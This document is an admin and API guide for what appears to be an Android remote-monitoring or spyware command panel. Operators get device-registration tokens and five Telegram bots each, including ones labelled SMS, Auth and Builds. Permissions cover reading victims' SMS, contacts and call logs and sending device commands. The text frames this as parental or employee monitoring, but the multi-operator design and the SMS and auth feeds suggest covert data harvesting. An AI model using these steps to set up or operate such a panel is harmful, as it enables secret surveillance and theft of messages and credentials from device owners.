# ?? Admin Management Guide

Complete guide for managing administrators and users.

## Table of Contents

1. [Admin Roles](#admin-roles)
2. [Creating Admins](#creating-admins)
3. [Permissions](#permissions)
4. [Device Token System](#device-token-system)
5. [Updating Admins](#updating-admins)
6. [Best Practices](#best-practices)

---

## Admin Roles

### Super Admin (Administrator)

**Role:** `super_admin`

**Permissions:**
- ? Full system access
- ? See all devices from all admins
- ? See all activities
- ? Create/edit/delete admins
- ? System configuration

**Notifications:**
- Receives ALL notifications from ALL admins
- Segregated by bot type (Bot 1-5)

**Use Case:**
- System owner
- Full oversight
- Security monitoring

---

### Admin

**Role:** `admin`

**Permissions:**
- ? See only their own devices
- ? See only their device activities
- ? Send commands to their devices
- ? View logs of their devices
- ? Cannot see other admins' devices
- ? Cannot create/edit admins

**Notifications:**
- Only from their own devices
- Via their 5 personal bots

**Use Case:**
- Parent monitoring their child's device
- Employee managing assigned devices

---

### Viewer

**Role:** `viewer`

**Permissions:**
- ? View only (read-only)
- ? See assigned devices
- ? Cannot send commands
- ? Cannot edit settings
- ? Cannot create admins

**Use Case:**
- Reporting purposes
- Limited access users

---

## Creating Admins

### Step 1: Prepare Telegram Bots

For each new admin, create 5 bots:

```bash
# Use @BotFather in Telegram
/newbot ? Bot 1 (Devices)
/newbot ? Bot 2 (SMS)
/newbot ? Bot 3 (Logs)
/newbot ? Bot 4 (Auth)
/newbot ? Bot 5 (Builds)
```

Get chat ID for each bot (can be same for all):
```
https://api.telegram.org/bot<TOKEN>/getUpdates
```

### Step 2: Get Personal 2FA Chat ID

1. Start the 2FA bot (shared bot)
2. Send a message
3. Get chat ID from getUpdates

### Step 3: Create Admin via API

**Request:**
```bash
POST /admin/create
Authorization: Bearer <SUPER_ADMIN_TOKEN>
Content-Type: application/json

{
  "username": "john_doe",
  "email": "john@example.com",
  "password": "SecurePassword123!",
  "full_name": "John Doe",
  "role": "admin",
  
  "telegram_2fa_chat_id": "-1001234567890",
  
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "john_devices",
      "token": "1111111111:AAA_JOHN_BOT1",
      "chat_id": "-1001111111111"
    },
    {
      "bot_id": 2,
      "bot_name": "john_sms",
      "token": "2222222222:BBB_JOHN_BOT2",
      "chat_id": "-1002222222222"
    },
    {
      "bot_id": 3,
      "bot_name": "john_logs",
      "token": "3333333333:CCC_JOHN_BOT3",
      "chat_id": "-1003333333333"
    },
    {
      "bot_id": 4,
      "bot_name": "john_auth",
      "token": "4444444444:DDD_JOHN_BOT4",
      "chat_id": "-1004444444444"
    },
    {
      "bot_id": 5,
      "bot_name": "john_builds",
      "token": "5555555555:EEE_JOHN_BOT5",
      "chat_id": "-1005555555555"
    }
  ]
}
```

**Response:**
```json
{
  "username": "john_doe",
  "email": "john@example.com",
  "full_name": "John Doe",
  "role": "admin",
  "device_token": "abc123def456ghi789...",
  "telegram_2fa_chat_id": "-1001234567890",
  "telegram_bots": [...],
  "is_active": true,
  "created_at": "2025-10-31T10:00:00Z"
}
```

**Important:** Save the `device_token`! Give this to the admin for device registration.

---

## Permissions

### Permission System

```python
class AdminPermission(str, Enum):
    VIEW_DEVICES = "view_devices"
    MANAGE_DEVICES = "manage_devices"
    SEND_COMMANDS = "send_commands"
    VIEW_SMS = "view_sms"
    VIEW_CONTACTS = "view_contacts"
    VIEW_CALL_LOGS = "view_call_logs"
    MANAGE_ADMINS = "manage_admins"
    VIEW_LOGS = "view_logs"
    SYSTEM_CONFIG = "system_config"
```

### Role Permissions

**Super Admin:**
```python
[
    "view_devices",
    "manage_devices",
    "send_commands",
    "view_sms",
    "view_contacts",
    "view_call_logs",
    "manage_admins",
    "view_logs",
    "system_config"
]
```

**Admin:**
```python
[
    "view_devices",
    "manage_devices",
    "send_commands",
    "view_sms",
    "view_contacts",
    "view_call_logs",
    "view_logs"
]
```

**Viewer:**
```python
[
    "view_devices",
    "view_sms",
    "view_contacts",
    "view_call_logs",
    "view_logs"
]
```

### Custom Permissions

You can assign custom permissions:

```bash
PUT /admin/update/john_doe
{
  "permissions": [
    "view_devices",
    "view_sms",
    "send_commands"
  ]
}
```

---

## Device Token System

### What is a Device Token?

- Unique identifier for each admin
- Used by Android app during device registration
- Links devices to admin accounts
- Automatically generated when admin is created

### How It Works

**1. Admin Created:**
```json
{
  "username": "john_doe",
  "device_token": "abc123def456..."
}
```

**2. Android App Registration:**
```json
POST /register
{
  "device_id": "SAMSUNG-A20-123",
  "device_info": {...},
  "admin_token": "abc123def456..."
}
```

**3. Device Linked:**
```json
{
  "device_id": "SAMSUNG-A20-123",
  "admin_username": "john_doe",
  "admin_token": "abc123def456...",
  "registered_at": "2025-10-31T10:00:00Z"
}
```

### Get Device Token

**For yourself:**
```bash
GET /auth/me
Authorization: Bearer <YOUR_TOKEN>
```

**For another admin (Super Admin only):**
```bash
GET /admin/list
Authorization: Bearer <SUPER_ADMIN_TOKEN>
```

Response includes `device_token` for each admin.

### Security

- ? Token is 32+ characters long
- ? Randomly generated
- ? Unique per admin
- ? Cannot be guessed
- ?? Keep it secret!

---

## Updating Admins

### Update Profile

```bash
PUT /admin/update/{username}
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "full_name": "John Smith",
  "email": "john.smith@example.com"
}
```

### Update Telegram Bots

```bash
PUT /admin/update/{username}
{
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "john_devices_new",
      "token": "NEW_TOKEN_1",
      "chat_id": "-1001111111111"
    },
    ... (all 5 bots)
  ]
}
```

### Update 2FA Chat ID

```bash
PUT /admin/update/{username}
{
  "telegram_2fa_chat_id": "-1009876543210"
}
```

### Change Password

```bash
POST /admin/change-password
{
  "old_password": "OldPassword123!",
  "new_password": "NewPassword456!"
}
```

### Deactivate Admin

```bash
PUT /admin/update/{username}
{
  "is_active": false
}
```

---

## Best Practices

### Security

1. **Strong Passwords**
   ```
   ? Minimum 8 characters
   ? Mix of letters, numbers, symbols
   ? Not dictionary words
   ```

2. **Token Management**
   ```
   ? Keep device_token secret
   ? Don't share between admins
   ? Rotate tokens periodically
   ```

3. **Access Control**
   ```
   ? Use minimum required role
   ? Review permissions regularly
   ? Deactivate unused accounts
   ```

### Telegram Bot Setup

1. **Unique Bots**
   ```
   ? Create separate bots for each admin
   ? Don't share bot tokens
   ? Use descriptive names
   ```

2. **Chat IDs**
   ```
   ? Can use same chat_id for all 5 bots
   ? Or use different chats for organization
   ? Double-check before saving
   ```

3. **Testing**
   ```
   ? Send test message to each bot
   ? Verify notifications work
   ? Check message formatting
   ```

### Admin Organization

1. **Naming Convention**
   ```
   Username: lowercase, no spaces
   Example: john_doe, jane_smith
   
   Bot Names: descriptive
   Example: john_devices, john_sms
   ```

2. **Documentation**
   ```
   ? Keep record of device_tokens
   ? Document bot tokens (securely)
   ? Note admin purposes
   ```

3. **Regular Audits**
   ```
   ? Review active admins monthly
   ? Check device assignments
   ? Verify permissions are correct
   ```

---

## API Reference

### List All Admins

```bash
GET /admin/list
Authorization: Bearer <SUPER_ADMIN_TOKEN>
```

Response:
```json
[
  {
    "username": "john_doe",
    "email": "john@example.com",
    "full_name": "John Doe",
    "role": "admin",
    "device_token": "abc123...",
    "telegram_2fa_chat_id": "-1001234567890",
    "telegram_bots": [...],
    "is_active": true,
    "last_login": "2025-10-31T10:00:00Z",
    "login_count": 42,
    "created_at": "2025-10-01T10:00:00Z"
  }
]
```

### Get Admin Details

```bash
GET /admin/{username}
Authorization: Bearer <TOKEN>
```

### Delete Admin

```bash
DELETE /admin/{username}
Authorization: Bearer <SUPER_ADMIN_TOKEN>
```

?? **Warning:** This will:
- Delete admin account
- Keep devices (unassigned)
- Keep historical data

---

## Troubleshooting

### Problem: Notifications Not Received

**Check:**
1. Bot tokens are correct
2. Chat IDs are correct
3. Bots are started in Telegram
4. `telegram_bots` array has 5 items

**Test:**
```bash
curl https://api.telegram.org/bot<TOKEN>/sendMessage \
  -d chat_id=-1001234567890 \
  -d text="Test"
```

### Problem: Device Not Registering

**Check:**
1. `device_token` is correct
2. Token belongs to active admin
3. Admin has `manage_devices` permission

**Verify:**
```bash
GET /auth/me
# Check device_token matches
```

### Problem: Cannot Create Admin

**Check:**
1. You have `manage_admins` permission
2. Username is unique
3. Email is unique
4. All 5 bots provided

**Common Errors:**
```
- "Username already exists"
- "Email already exists"
- "Must provide 5 telegram bots"
```

---

## Summary

### Quick Reference

**Create Admin:**
```
1. Create 5 bots (@BotFather)
2. Get tokens + chat IDs
3. POST /admin/create
4. Save device_token
5. Give token to admin
```

**Update Admin:**
```
PUT /admin/update/{username}
- Change profile info
- Update bots
- Change permissions
```

**Deactivate Admin:**
```
PUT /admin/update/{username}
{"is_active": false}
```

---

**For bot setup details, see: BOT_SYSTEM_GUIDE.md**
